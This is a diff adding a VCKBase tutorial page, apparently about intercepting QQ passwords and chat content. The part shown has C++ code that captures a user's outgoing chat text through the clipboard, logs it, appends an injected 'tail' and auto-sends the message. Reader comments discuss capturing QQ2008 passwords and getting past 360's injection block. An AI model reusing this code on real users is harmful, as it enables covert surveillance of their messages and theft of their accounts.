+　　	int nSleepTime = 100;
+　　
+　　	// 激活“发送文字信息的编辑框”并获取输入焦点
+　　	ActiveWindowAndHoldFocus ( m_pFindQQChatInfoPara_WillSendTextMsg-&gt;m_hWndChatWindow );
+　　	CRect rcEditForSendMessage(0,0,0,0);
+　　	::GetWindowRect ( m_pFindQQChatInfoPara_WillSendTextMsg-&gt;m_hWndEditForSendMessage, &rcEditForSendMessage );
+　　	::SetFocus ( m_pFindQQChatInfoPara_WillSendTextMsg-&gt;m_hWndEditForSendMessage );	
+　　	MouseLeftClick ( rcEditForSendMessage.CenterPoint() );
+　　	
+　　	// 将要发送的文字内容拷贝出来并保存起来
+　　	CString csSendingText;
+　　	for ( int i=0; i&lt;10; i++ )
+　　	{
+　　		GetClipBoardText ();	// 清空剪贴板
+　　		KeyboardCombineEvent ( VK_CONTROL, 'A', '\0' );
+　　		Sleep(nSleepTime);
+　　		KeyboardCombineEvent ( VK_CONTROL, 'C', '\0' );
+　　		Sleep(nSleepTime);
+　　		csSendingText = GetClipBoardText();
+　　		HwDbgLog ( L_DEBUG, _T("csSendingText = %s"), csSendingText );
+　　		if ( !csSendingText.IsEmpty() )
+　　			break;
+　　	}
+　　	HwDbgLog ( L_DEBUG, _T("发送文字信息: %s"), csSendingText );
+　　	if ( csSendingText.IsEmpty() )
+　　	{
+　　		return csSendingText;
+　　	}
+　　	else
+　　	{
+　　		m_pFindQQChatInfoPara_WillSendTextMsg-&gt;AddQQChatContent ( TRUE, csSendingText );
+　　	}
+　　
+　　	return csSendingText;
+　　}
+</pre>
+
+		<a name="增加QQ尾巴">增加QQ尾巴</a><br>
+		　　在获取到聊天内容后，还可以用模拟键盘的方式将QQ尾巴信息加到要发送的文字后面，如下代码所示：
+<pre>
+　　CString CQQMate::AddQQTailText ()
+　　{
+　　	HwDbgLog ( L_DEBUG, _T("----------------------------- AddQQTailText()") );
+　　	int nSleepTime = 100;
+　　	CString csQQTail;
+　　	
+　　	// 将“消息模式”的聊天窗口透明化隐藏起来
+　　	if ( m_pFindQQChatInfoPara_WillSendTextMsg-&gt;m_eQQChatWindowType == QQCHATWINDOW_MESSAGEMODE )
+　　	{
+　　//		TransparentWindow ( m_pFindQQChatInfoPara_WillSendTextMsg-&gt;m_hWndChatWindow, 0 );
+　　		::ShowWindow ( m_pFindQQChatInfoPara_WillSendTextMsg-&gt;m_hWndChatWindow, SW_RESTORE );
+　　	}
+　　	
+　　	// 增加QQ尾巴内容
+　　	int nQQTailPos = -1;
+　　	csQQTail = GetQQTailText ( m_pFindQQChatInfoPara_WillSendTextMsg-&gt;m_csQQPeerAccount );
+　　	if ( !csQQTail.IsEmpty() )
+　　	{
+　　		if ( m_pFindQQChatInfoPara_WillSendTextMsg-&gt;m_eQQChatWindowType == QQCHATWINDOW_DISCUSSION )
+　　			csQQTail.Insert ( 0, _T("\r\n") );
+　　		CopyTextToClipboard ( csQQTail );
+　　		Sleep(nSleepTime);
+　　		if ( m_pFindQQChatInfoPara_WillSendTextMsg-&gt;m_eQQChatWindowType == QQCHATWINDOW_DISCUSSION )
+　　			KeyboardCombineEvent ( VK_CONTROL, VK_END, '\0' );
+　　		else
+　　			KeyboardCombineEvent ( VK_CONTROL, 'A', '\0' );
+　　		Sleep(nSleepTime);
+　　		KeyboardCombineEvent ( VK_CONTROL, 'V', '\0' );
+　　		Sleep(nSleepTime);
+　　	}
+　　	HwDbgLog ( L_DEBUG, _T("QQ尾巴内容 = %s"), csQQTail );
+　　	return csQQTail;
+　　}
+</pre>
+　　由于我们是在用户做了发送操作（点“发送”按钮、按快捷键“Ctrl+Enter”、按快捷键“Alt+S”）之后才进行我们的处理，所以简单地将QQ尾巴信息加到发送框里是发送不出去的，所以我们必须在增加QQ尾巴信息完成后再向QQ聊天窗口发送一个“发送按钮”被点击的消息，如下代码所示：
+<pre>
+　　if ( !csQQTail.IsEmpty() )
+　　{
+　　	::PostMessage ( m_pFindQQChatInfoPara_WillSendTextMsg-&gt;m_hWndChatWindow, 
+			WM_COMMAND, 
+			(WPARAM)CONTROL_ID_CHAT_BUTTON_SEND, 
+			LPARAM(NULL) );
+　　}
+</pre>
+		
+		　　看看程序效果图：<p>
+		<img border="0" src="/document/journal/vckbase54/images/qqappcruckimg4.GIF" width="498" height="500"></p>
+		<p>　　输入聊天文字</p>
+		<p><img border="0" src="/document/journal/vckbase54/images/qqappcruckimg5.GIF" width="498" height="500"></p>
+		<p>　　发送聊天信息后自动增加了QQ尾巴<br>
+		　　<br>
+		<a name="去掉QQ广告栏">去掉QQ广告栏</a><br>
+		　　用EnumChildWindows() API函数查找到广告栏子窗口句柄，然后隐藏它，如下代码所示： </p>
+<pre>
+　　if ( !IsWindow(pFindQQChatInfoPara-&gt;m_hWndAD1) )
+　　	{
+　　		// 类名符合吗
+　　		if ( strstr_hw ( szClassName, _T("static") ) )
+　　		{
+　　			CRect rc, rcAD1(248,22,490,62);
+　　			::GetWindowRect ( hWnd, &rc );
+　　			CWnd::FromHandle(g_hWndQQChatWindow)-&gt;ScreenToClient ( &rc );
+　　			if ( rcAD1.EqualRect(&rc) || 
+　　				( rcAD1.PtInRect(rc.TopLeft()) && rcAD1.PtInRect(rc.BottomRight()) ) ||
+　　				( rc.PtInRect(rcAD1.TopLeft()) && rc.PtInRect(rcAD1.BottomRight()) )
+　　				)
+　　			{
+　　				pFindQQChatInfoPara-&gt;m_hWndAD1 = hWnd;
+　　				::ShowWindow ( hWnd, SW_HIDE );
+　　			}
+　　		}
+　　	}
+</pre>
+　　接着将我们需要显示的文字内容写上去，可以截获消息WM_PAINT和WM_ERASEBKGND，用设备上下文句柄显示我们的内容，如下代码所示：
+<pre>
+　　if ( uMsg == WM_PAINT || uMsg == WM_ERASEBKGND )
+　　	{
+　　		CRect rcAD1(248,22,490,62);
+　　		SetBkMode ( (HDC) wParam, TRANSPARENT );
+　　		if ( uMsg == WM_ERASEBKGND )
+　　		{
+　　			HwDbgLog ( L_DEBUG, _T("WM_ERASEBKGND ::FillRect") );
+　　			CBrush brsBkGnd;
+　　			brsBkGnd.CreateSolidBrush( RGB(114,201,252) );
+　　			FillRect ( (HDC) wParam, &rcAD1, (HBRUSH)brsBkGnd.GetSafeHandle() );
+　　		}
+　　
+　　		if ( uMsg == WM_ERASEBKGND || uMsg == WM_PAINT )
+　　		{
+　　			CString csAD1 = _T("这是广告位置，已经被屏蔽掉了。\r\n ——谢红伟");
+　　			::DrawText ( (HDC) wParam, csAD1, csAD1.GetLength(), &rcAD1, DT_CENTER|DT_VCENTER );
+　　		}
+　　	}
+</pre>
+		
+		　　执行效果如下图：<p>
+		<img border="0" src="/document/journal/vckbase54/images/qqappcruckimg6.GIF" width="498" height="395"></p>
+		<p>　　有广告的QQ聊天窗口</p>
+		<p><img border="0" src="/document/journal/vckbase54/images/qqappcruckimg7.GIF" width="498" height="395"></p>
+		<p>　　去掉广告栏之后的聊天窗口<br>
+		<br>
+		<a name="郑重申明">郑重申明</a><br>
+		　　本代码和本代码的相关文章仅供学习和技术交流之用，严禁用于非法用途，否则本人概不负任何责任！</p>
+		<p><br>
+		<a name="结束语">结束语</a><br>
+		　　本程序代码支持多个QQ同时登录的处理，但界面上只显示最后一个登录的QQ信息。<br>
+		　　知识就是力量，知识共享将具有推动时代进步的力量。希望我能为中国的软件行业尽一份薄力。<br>
+		　　你可以任意修改复制本代码，但请保留版权信息文字不要修改。<br>
+		　　由于水平有限，错误再所难免，请知情者原谅并告知，多谢！</p>
+		</p>
+    </td>
+  </tr>
+</table>
+    </td>
+  </tr>
+</table>
+<br>
+<div style="margin-left:40px">
+
+</div>
+<br>
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td align="right">
+
+
+<a href="javascript:;" class="tmblog" id="share_btn_1327833387226" onClick="postToWb()"><img src="http://v.t.qq.com/share/images/s/b24.png" border="0" alt="转播到腾讯微博"></a>
+
+<script>
+var _share_tencent_weibo = function() {
+    String.prototype.elength = function() {
+        return this.replace(/[^\u0000-\u00ff]/g, "aa").length;
+    };
+    String.prototype.tripurl = function() {
+        return this.replace(new RegExp("((news|telnet|nttp|file|http|ftp|https)://){1}(([-A-Za-z0-9]+(\\.[-A-Za-z0-9]+)*(\\.[-A-Za-z]{2,5}))|([0-9]{1,3}(\\.[0-9]{1,3}){3}))(:[0-9]*)?(/[-A-Za-z0-9_\\$\\.\\+\\!\\*\\(\\),;:@&=\\?/~\\#\\%]*)*", "gi"), new Array(12).join("aa"));
+    };
+    if ( !! window.find) {
+        HTMLElement.prototype.contains = function(B) {
+            return this.compareDocumentPosition(B) - 19 > 0
+        }
+    };
+    var _appkey = "801092013" || "801000271"; //你从腾讯微博开放平台获得的appkey
+    var _web = {
+        "name": document.title || "",
+        "href": location.href.replace(/([^\x00-\xff]+)/g,encodeURIComponent("$1")),
+        "hash": location.hash,
+        "target": "toolbar=0,status=0,resizable=1,width=630,height=530"
+    };
+    var _pic = function(area) {
+        var _imgarr = area.getElementsByTagName("img");
+        var _srcarr = [];
+        for (var i = 0; i < _imgarr.length; i++) {
+            _srcarr.push(encodeURIComponent(_imgarr[i].src));
+        }
+        return _srcarr.join("|");
+    };
+    var _text = function() {
+        var s1 = arguments[0] || "",
+        s2 = Array().slice.call(arguments, 1).join(" ").replace(/[\s\n]+/g, " "),
+        k = 257 - s1.tripurl().elength();
+        var s = s2.slice(0, (k - 4) >> 1);
+        if (s2.elength() > k) {
+            k = k - 3;
+            for (var i = k >> 1; i <= k; i++) {
+                if ((s2.slice(0, i)).tripurl().elength() >= k) {
+                    break;
+                }
+                else {
+                    s = s2.slice(0, i);
+                }
+            }
+            s += "...";
+        } else {
+            s = s2;
+        }
+        return [s1, s];
+    };
+    var _u = "http://share.v.t.qq.com/index.php?c=share&a=index&url=$url$&appkey=" + _appkey + "&assname=vckbase2012&title=$title$&pic=$pic$";
+    var qshare_btn = function(_arr) {
+        if (_arr[0]) {
+            return _arr[0];
+        }
+        else {
+            var o = document.createElement("a"),
+            _ostyle = "width:118px;height:25px;background:url(http://mat1.gtimg.com/app/opent/images/websites/share/qshare.png);position:absolute;display:none;";
+            o.setAttribute("style", _ostyle);
+            o.style.cssText = _ostyle;
+            o.setAttribute("href", "javascript:;");
+            document.body.insertBefore(o, document.body.childNodes[0]);
+            return o;
+        }
+    } (arguments);
+    var share_area = function(_arr) {
+        if (_arr[1]) {
+            if ((typeof _arr[1] == "object" && _arr[1].length) || (_arr[1].constructor == Array)) {
+                return _arr[1];
+            } else {
+                return [_arr[1]];
+            }
+        }
+        else {
+            return [document.body];
+        }
+    } (arguments);
+    var current_area = share_area[0];
+    var share_btn = function(_arr) {
+        if (_arr[2]) {
+            _arr[2].onclick = function() {
+                window.open(_u.replace("$title$", encodeURIComponent(_text(_web.name,"").join(" "))).replace("$url$", encodeURIComponent(_web.href)).replace("$pic$", _pic(share_area[0])).substr(0, 2048), 'null', _web.target);
+            }
+        } else {
+            return null;
+        }
+    } (arguments);
+    var _select = function() {
+        return (document.selection ? document.selection.createRange().text: document.getSelection()).toString().replace(/[\s\n]+/g, " ");
+    };
+    var show = function(e, x, y) {
+        with(qshare_btn.style) {
+            display = "inline-block";
+            left = x + "px";
+            top = y + "px";
+            position = "absolute";
+            zIndex = "999999";
+        }
+    };
+    var hide = function(e) {
+        e.style.display = "none";
+    };
+    document.onmouseup = function(e) {
+        e = e || window.event;
+        var o = e.target || e.srcElement;
+        for (var i = 0; i < share_area.length; i++) {
+            if (share_area[i].contains(o) || share_area[i] == o) {
+                var _e = {
+                    "x": e.clientX,
+                    "y": e.clientY
+                };
+                var _o = {
+                    "w": qshare_btn.clientWidth,
+                    "h": qshare_btn.clientHeight
+                };
+                var _d = window.pageYOffset || (document.documentElement || document.body).scrollTop || 0;
+                var x = (_e.x - _o.w < 0) ? _e.x + _o.w: _e.x - _o.w,
+                y = (_e.y - _o.h < 0) ? _e.y + _d - _o.h: _e.y + _d;
+                if (_select() && _select().length >= 10 && o != qshare_btn) {
+                    show(qshare_btn, x - 5, y);
+                    current_area = share_area[i];
+                    break;
+                } else {
+                    hide(qshare_btn);
+                }
+
+            } else {
+                hide(qshare_btn);
+            }
+        }
+    };
+    document.onmouseover = function(e) {
+        var curtarget = (e && e.target) || (window.event && window.event.srcElement),
+        sx = parseInt(qshare_btn.style.width),
+        sy = parseInt(qshare_btn.style.height),
+        d = Math.min(sx, sy);
+        if (curtarget.tagName.toLowerCase() == "img") {
+            var erect = curtarget.getBoundingClientRect();
+            if (curtarget.clientWidth >= 150 && curtarget.clientHeight >= 150) {
+                show(qshare_btn, erect.right - sx - d, erect.bottom + document.body.scrollTop + document.documentElement.scrollTop - sy - d);
+                qshare_btn.setAttribute("shareimg", curtarget.src);
+            }
+        } else if (curtarget != qshare_btn && qshare_btn.getAttribute("shareimg")) {
+            qshare_btn.removeAttribute("shareimg");
+            hide(qshare_btn);
+        }
+    };
+    document.onmousedown = function(e) {
+        var curtarget = (e && e.target) || (window.event && window.event.srcElement);
+        if (curtarget != qshare_btn) {
+            if (document.selection) {
+                document.selection.empty();
+            } else if (window.getSelection) {
+                window.getSelection().removeAllRanges();
+            }
+        }
+    };
+    qshare_btn.onclick = function() {
+        var shareimg = qshare_btn.getAttribute("shareimg");
+        if (shareimg != null) {
+            window.open(_u.replace("$title$", encodeURIComponent(_web.name)).replace("$url$", encodeURIComponent(_web.href)).replace("$pic$", encodeURIComponent(shareimg)).substr(0, 2048), 'null', _web.target);
+            return;
+        }
+        var _str = _select();
+        _resultstr = _text(_web.name, _str).reverse().join(" ");
+        if (_str) {
+            var url = _u.replace("$title$", encodeURIComponent(_resultstr)).replace("$pic$", _pic(current_area));
+            url = url.replace("$url$", encodeURIComponent(_web.href.replace(_web.hash, "") + "#" + (current_area["name"] || current_area["id"] || ""))).substr(0, 2048);
+            window.open(url, 'null', _web.target);
+        }
+        hide(this);
+    };
+};
+_share_tencent_weibo(null,null,document.getElementById("share_btn_1327833387226"));
+/*
+_share_tencent_weibo(qshare_btn,qshare_area,share_btn);
+qshare_btn:Q-Share功能按钮，选中文字或鼠标放在功能区域中的大图上后显示的转播按钮
+qshare_area:Q-Share功能区域，可以是一个Dom数组
+share_btn:一键转播功能按钮，点击后将会弹出转播页面
+如须自定义功能，qshare_btn,share_area,share_btn自己设置,其中qshare_area可以是一个DOM数组
+*/
+</script>
+
+<script type="text/javascript" charset="utf-8">
+(function(){
+  var _w = 106 , _h = 24;
+  var param = {
+    url:location.href,
+    type:'5',
+    count:'', /**是否显示分享数，1显示(可选)*/
+    appkey:'', /**您申请的应用appkey,显示分享来源(可选)*/
+    title:'', /**分享的文字内容(可选，默认为所在页面的title)*/
+    pic:'', /**分享图片的路径(可选)*/
+    ralateUid:'2667733442', /**关联用户的UID，分享微博会@该用户(可选)*/
+	language:'zh_cn', /**设置语言，zh_cn|zh_tw(可选)*/
+    rnd:new Date().valueOf()
+  }
+  var temp = [];
+  for( var p in param ){
+    temp.push(p + '=' + encodeURIComponent( param[p] || '' ) )
+  }
+  document.write('<iframe allowTransparency="true" frameborder="0" scrolling="no" src="http://hits.sinajs.cn/A1/weiboshare.html?' + temp.join('&') + '" width="'+ _w+'" height="'+_h+'"></iframe>')
+})()
+</script>
+
+
+
+
+
+</td>
+<td width="50"></td>
+  </tr>
+</table>
+  <br>
+  <table width="98%" border="0" cellspacing="0" cellpadding="0" class="small" height="18">
+    <tr valign="middle"> 
+      <td bgcolor="#A0D39B" width="47%"><img src="/SYS/script/image/toplogo.gif" width="10" height="10">最新评论 
+        <a href="/SYS/script/viewcomment.asp?gclsid=100&itemid=1860" target='_blank'><span class=small>[发表评论]</span></a> <a href="http://www.vckbase.com/support/contribute.html" target='_blank'><span class=small>[文章投稿]</span></a></td>
+      <td bgcolor="#A0D39B" width="53%" align="right"><img src="image/rec1.gif" width="9" height="9"> 
+        <a href="/SYS/script/viewcomment.asp?gclsid=100&itemid=1860" target='_blank'><span class=small>查看所有评论</span></a>
+        <img src="image/rec1.gif" width="9" height="9"> <a href="/SYS/script/writemail.asp?gclsid=100&itemid=1860&title=%c8%e7%ba%ce%bd%d8%c8%a1QQ%c3%dc%c2%eb%ba%cd%c1%c4%cc%ec%c4%da%c8%dd%a1%a2%c8%a5%b5%f4QQ%b9%e3%b8%e6%c0%b8%a1%a2%cc%ed%bc%d3QQ%ce%b2%b0%cd" target='_blank'><span class=small>推荐给好友</span></a>
+        <img src="image/rec1.gif" width="9" height="9"> <a href="javascript:window.print();"><span class=small>打印</span></a></td>
+    </tr>
+  </table>
+<table width='98%' border=0 cellspacing=1 cellpadding=0 bgcolor='#ffffff' class='small'><tr><td bgcolor='#FFFFFF'><br><img src='../image/doc2.gif' width=11 height=11 align='absmiddle'> 人才啊，师傅收我为徒吧！ ( YouthKing 发表于 2011-7-11 15:28:00)<br>&nbsp;<br><img src='../image/doc2.gif' width=11 height=11 align='absmiddle'> 太强了。学习学习<br> ( guhqjack 发表于 2010-8-7 7:28:00)<br>&nbsp;<br><img src='../image/doc2.gif' width=11 height=11 align='absmiddle'> 2009用spy++捕获不到登陆按钮&nbsp;&nbsp;聊天窗口只能捕获到整个的聊天窗口，发送按钮和输入文本区域都捕获不到，这该怎么办啊 ( 若离 发表于 2009-6-21 19:13:00)<br>&nbsp;<br><img src='../image/doc2.gif' width=11 height=11 align='absmiddle'> 拜读,呵呵!! ( Powerful_Wu 发表于 2009-5-23 17:21:00)<br>&nbsp;<br><img src='../image/doc2.gif' width=11 height=11 align='absmiddle'> 该代码我只在QQ2008上测试通过，文章发表后不久我就下载到QQ2009，发现tencent在安全性方面没少下功夫，文章提到的方法需加改进才能捕捉到QQ2009的密码，等有时间再来研究了，若有志同道合的朋友先研究出来不妨通知一声。听群里的朋友说QQ2009不好用，很多人装了后又卸载了，所以QQ2008的用户数还是占绝大多数的。 ( chrys 发表于 2009-3-2 2:44:00)<br>&nbsp;<br><img src='../image/doc2.gif' width=11 height=11 align='absmiddle'> 还有哦，我开了那个360密码保险箱，拦住了，不给注入，哈哈。估计别的杀毒软件也会拦。要是做到能绕过就牛了 ( zouyingbin 发表于 2009-2-21 11:24:00)<br>&nbsp;<br><img src='../image/doc2.gif' width=11 height=11 align='absmiddle'> 呵呵，创建的编辑框和QQ的密码输入框对得不齐。做得不错！ ( zouyingbin 发表于 2009-2-21 11:22:00)<br>&nbsp;<br>.......................................................<BR><a href='/SYS/script/viewcomment.asp?gclsid=100&itemid=1860' target='_blank'><span class=small>More...</span></a> </td></tr></table>
+<br>
+<table width="100%" height="55" border="0" cellpadding="0" cellspacing="0">
+  <tr>
+    <td align="right"><iframe width="750" height="55" frameborder="0" allowtransparency="true" marginwidth="0" marginheight="0" scrolling="no" border="0" src="http://www.vckbase.com/shatt2.html"></iframe></td>
+  </tr>
+</table>
+
+
+<div align="right"><br>
+  <span class="small">版权所有 &copy; 1999 - 2011 VC知识库&nbsp; </span>
+  <script src="http://s9.cnzz.com/stat.php?id=3835396&web_id=3835396&show=pic" language="JavaScript"></script><br>
+</div>
+</body>
+</html>
